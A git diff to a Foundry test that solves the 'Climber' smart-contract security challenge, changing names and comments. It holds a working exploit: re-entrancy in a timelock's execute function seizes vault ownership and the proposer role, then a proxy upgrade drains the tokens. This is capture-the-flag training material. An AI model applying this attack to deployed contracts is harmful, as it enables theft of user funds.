@@ -38,8 +38,8 @@ contract ClimberTest is Test {
         deal(attacker, 0.1 ether);
         assertEq(attacker.balance, 0.1 ether);
 
-        // Deploy the vault behind a proxy using the UUPS pattern,
-        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
+        // UUPS pattern,
+        // `ClimberVault::initialize(address,address,address)` function
         vm.startPrank(deployer);
         ClimberVault vaultImplementation = new ClimberVault();
         vm.label(address(vaultImplementation), "ClimberVault Impl");
@@ -77,13 +77,10 @@ contract ClimberTest is Test {
     }
 
     function exploit() internal {
-        /** CODE YOUR EXPLOIT HERE */
-
         // upgrade the vault to a new implementation with sweep/withdrawALl option
-        // If we are able to upgrade the vault to a new implementation we could do whatever we want, add a new method or become the sweeper
-        // it does not matter at that point
+        // If we are able to upgrade the vault to a new implementation we could do whatever we want as it will be our implementation
 
-        // The current owner of the Vault is the Timelock itself
+        // The current owner of the Vault is the Timelock
         // This mean that only the Timelock can call `vault.transferOwnership` to change the ownership
         // In order to be able to execute all these function from the Timelock the PROPOSER 
         // must schedule an operation containing them and someone (anyone) have to execute that bulk operation
@@ -100,7 +97,7 @@ contract ClimberTest is Test {
         // Before ending the `execute` the operation (just executed) must be scheduled!
 
         // Deploy the external contract that will take care of executing the `schedule` function
-        Middleman middleman = new Middleman();
+        AttackExecutor middleman = new AttackExecutor();
 
         // prepare the operation data composed by 3 different actions
         bytes32 salt = keccak256("attack proposal");
@@ -131,13 +128,13 @@ contract ClimberTest is Test {
         // For example we could upgrade to a new implementation that allow us to do whatever we want
         // Deploy the new implementation
         vm.startPrank(attacker);
-        PawnedClimberVault newVaultImpl = new PawnedClimberVault();
+        ClimberVaultExploited newVaultImpl = new ClimberVaultExploited();
 
         // Upgrade the proxy implementation to the new vault
         vault.upgradeTo(address(newVaultImpl));
 
         // withdraw all the funds
-        PawnedClimberVault(address(vault)).withdrawAll(address(token));
+        ClimberVaultExploited(address(vault)).withdrawAll(address(token));
         vm.stopPrank();
 
         // PS: I think that this exploit is based on a vulnerability found in the first release of the OpenZeppelin Timelocker contract
@@ -149,12 +146,12 @@ contract ClimberTest is Test {
     }
 }
 
-contract Middleman {
+contract AttackExecutor {
 
     function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt) external {
         // Recreate the scheduled operation from the Middle man contract and call the vault
         // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
-        // This is leveraging the existing re-entrancy exploit in `execute`
+        // re-entrancy exploit in `execute`
         ClimberTimelock vaultTimelock = ClimberTimelock(payable(vaultTimelockAddress));
 
         address[] memory targets = new address[](3);
@@ -166,7 +163,7 @@ contract Middleman {
         values[0] = 0;
         dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
 
-        // set the attacker as the owner
+        // add PROPOSER role
         targets[1] = vaultTimelockAddress;
         values[1] = 0;
         dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
@@ -181,7 +178,7 @@ contract Middleman {
 
 }
 
-contract PawnedClimberVault is ClimberVault {
+contract ClimberVaultExploited is ClimberVault {
 
     /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() initializer {}
